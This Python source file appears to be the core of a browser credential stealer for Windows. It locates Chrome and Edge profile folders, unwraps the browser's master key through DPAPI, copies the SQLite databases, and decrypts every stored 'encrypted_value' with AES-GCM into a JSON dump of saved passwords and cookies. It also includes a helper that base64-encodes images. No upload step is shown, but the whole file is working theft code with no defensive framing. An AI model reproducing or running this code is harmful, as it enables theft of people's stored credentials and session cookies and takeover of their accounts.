import os
import json
import base64
import sqlite3
import win32crypt
from Cryptodome.Cipher import AES
import shutil

def get_available_chromium_based_browsers_dirs():
    av = []

    CHROME_PATH = os.path.normpath(f"{os.environ['USERPROFILE']}\\AppData\\Local\\Google\\Chrome\\User Data")
    EDGE_PATH = os.path.normpath(f"{os.environ['USERPROFILE']}\\AppData\\Local\\Microsoft\\Edge\\User Data")

    if os.path.exists(CHROME_PATH):
        av.append(CHROME_PATH)
    if os.path.exists(EDGE_PATH):
        av.append(EDGE_PATH)

    return av


def get_secret_key(b_path):
    CHROME_PATH_LOCAL_STATE = os.path.join(b_path, 'Local State')
    try:
        #(1) Get secretkey from chrome local state
        with open( CHROME_PATH_LOCAL_STATE, "r", encoding='utf-8') as f:
            local_state = f.read()
            local_state = json.loads(local_state)
        secret_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
        #Remove suffix DPAPI
        secret_key = secret_key[5:] 
        secret_key = win32crypt.CryptUnprotectData(secret_key, None, None, None, 0)[1]
        return secret_key
    except Exception as e:
        print("%s"%str(e))
        print("[ERR] Chrome secretkey cannot be found")
        return None
    
def decrypt_payload(cipher, payload):
    return cipher.decrypt(payload)

def generate_cipher(aes_key, iv):
    return AES.new(aes_key, AES.MODE_GCM, iv)

def decrypt_password(ciphertext, secret_key):
    try:
        #(3-a) Initialisation vector for AES decryption
        initialisation_vector = ciphertext[3:15]
        #(3-b) Get encrypted password by removing suffix bytes (last 16 bits)
        #Encrypted password is 192 bits
        encrypted_password = ciphertext[15:-16]
        #(4) Build the cipher to decrypt the ciphertext
        cipher = generate_cipher(secret_key, initialisation_vector)
        decrypted_pass = decrypt_payload(cipher, encrypted_password)
        decrypted_pass = decrypted_pass.decode()  
        return decrypted_pass
    except Exception as e:
        print("%s"%str(e))
        print("[ERR] Unable to decrypt, Chrome version <80 not supported. Please check.")
        return ""
    
def get_db_connection(db_path):
    file_name = os.path.basename(db_path)
    try:
        shutil.copy2(db_path, file_name) 
        return file_name, sqlite3.connect(file_name)
    except Exception as e:
        print("%s"%str(e))
        print("[ERR] Chrome database cannot be found")
        return None

def db_to_json(conn, secret_key=None):
    cursor = conn.cursor()

    # Get table names
    cursor.execute("SELECT name FROM sqlite_master WHERE type='table';")
    tables = cursor.fetchall()

    # Store table data
    data = {}
    for table in tables:
        table_name = table[0].decode()
        cursor.execute(f"SELECT * FROM {table_name}")
        rows = cursor.fetchall()

        # Convert rows to list of dictionaries
        table_data = []
        for row in rows:
            row_dict = {}
            for idx, column in enumerate(cursor.description):
                try:
                    if secret_key != None and column[0] == 'encrypted_value':
                        dec = decrypt_password(row[idx], secret_key)
                    else:
                        dec = row[idx].decode('latin1')
                except:
                    dec = row[idx]

                row_dict[column[0]] = dec
            table_data.append(row_dict)

        data[table_name] = table_data

    cursor.close()
    return data

def image_to_base64(image_path):
    try:
        with open(image_path, "rb") as img_file:
            encoded_string = base64.b64encode(img_file.read()).decode('utf-8')
            return encoded_string
    except FileNotFoundError:
        return "File not found"
    except Exception as e:
        return f"Error: {str(e)}"